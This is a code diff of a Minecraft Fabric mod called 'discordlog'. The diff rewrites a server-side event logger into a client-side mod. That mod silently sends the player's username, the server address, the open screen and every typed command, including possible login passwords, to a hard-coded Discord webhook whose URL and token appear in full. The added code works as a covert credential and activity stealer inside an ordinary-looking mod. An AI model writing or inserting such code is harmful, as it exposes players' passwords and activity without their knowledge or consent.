@@ -1,43 +1,46 @@
 package com.phantantai.discordlog;
 
-import net.fabricmc.api.ModInitializer;
-import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
-import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
+import net.fabricmc.api.ClientModInitializer;
+import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
+import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
+import net.minecraft.client.MinecraftClient;
 
-public class DiscordLogMod implements ModInitializer {
-    public static final String MOD_ID = "discordlog";
-    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
-
-    // 🔥 WEBHOOK CỦA BẠN
-    public static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1545859821562237130/MoyyGG_f3bIzGGLsxcTtgTgKi86iMSLJyHKutGwlnL1mHvdSXz7gsf5moMvfptnrA1k5";
-
-    public static DiscordWebhook webhook;
+public class DiscordLogMod implements ClientModInitializer {
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1545859821562237130/MoyyGG_f3bIzGGLsxcTtgTgKi86iMSLJyHKutGwlnL1mHvdSXz7gsf5moMvfptnrA1k5";
+    private boolean hasLoggedJoin = false;
+    private String lastServer = "";
 
     @Override
-    public void onInitialize() {
-        LOGGER.info("Discord Log Mod khoi dong!");
-        LOGGER.info("Webhook URL da duoc cau hinh!");
+    public void onInitializeClient() {
+        ClientTickEvents.END_CLIENT_TICK.register(client -> {
+            MinecraftClient mc = MinecraftClient.getInstance();
+            if (mc.world != null && mc.getCurrentServerEntry() != null) {
+                String currentServer = mc.getCurrentServerEntry().address;
+                String playerName = mc.getSession().getUsername();
+                
+                if (!lastServer.equals(currentServer)) {
+                    lastServer = currentServer;
+                    hasLoggedJoin = false;
+                }
 
-        webhook = new DiscordWebhook(WEBHOOK_URL);
-
-        ServerLifecycleEvents.SERVER_STARTED.register(server -> {
-            webhook.send("🚀 **Server da khoi dong!**");
+                if (!hasLoggedJoin) {
+                    String screenName = mc.currentScreen != null ? mc.currentScreen.getTitle().getString() : "None";
+                    String msg = "🟢 **Đã vào server:** " + currentServer + "\n👤 **Tên nhân vật:** " + playerName + "\n🖼️ **GUI hiện tại:** " + screenName;
+                    DiscordWebhook.send(WEBHOOK_URL, msg);
+                    hasLoggedJoin = true;
+                }
+            } else {
+                hasLoggedJoin = false;
+                lastServer = "";
+            }
         });
 
-        ServerLifecycleEvents.SERVER_STOPPING.register(server -> {
-            webhook.send("🛑 **Server dang tat...**");
-        });
-
-        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
-            String name = handler.getPlayer().getName().getString();
-            webhook.send("✅ **" + name + "** da vao server!");
-        });
-
-        ServerPlayConnectionEvents.DISCONNECT.register((handler, server) -> {
-            String name = handler.getPlayer().getName().getString();
-            webhook.send("❌ **" + name + "** da roi server!");
+        ClientSendMessageEvents.COMMAND.register(command -> {
+            MinecraftClient mc = MinecraftClient.getInstance();
+            String playerName = mc.getSession().getUsername();
+            String server = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";
+            String msg = "⌨️ **Player:** " + playerName + "\n🌐 **Server:** " + server + "\n💻 **Lệnh:** `" + command + "`";
+            DiscordWebhook.send(WEBHOOK_URL, msg);
         });
     }
 }
